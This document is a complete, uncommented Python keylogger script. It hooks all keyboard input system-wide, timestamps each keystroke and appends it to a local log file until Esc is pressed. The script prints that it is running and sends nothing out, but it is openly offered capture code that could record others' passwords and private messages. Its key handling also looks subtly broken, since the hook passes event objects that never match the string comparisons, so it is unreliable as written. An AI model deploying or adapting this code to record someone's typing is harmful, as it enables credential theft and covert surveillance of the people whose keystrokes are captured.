import keyboard 
import datetime  
import os

def log_keystrokes(key):

    log_file = "keystrokes_log.txt"
  
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if key == "space":
        key = " "
    elif key == "enter":
        key = "[ENTER]\n"
    elif key == "tab":
        key = "[TAB]"
    elif key == "backspace":
        key = "[BACKSPACE]"
    else:
        key = f"'{key}'"
    
    log_entry = f"{timestamp}: {key}"
    with open(log_file, "a") as file:
        file.write(log_entry)

def start_keylogger():
    print("Keylogger started. Press 'Esc' to stop.")
    
    keyboard.hook(log_keystrokes)
    
    keyboard.wait("esc")
    
    print("Keylogger stopped.")

if __name__ == "__main__":
    if os.path.exists("keystrokes_log.txt"):
        os.remove("keystrokes_log.txt")

    start_keylogger()
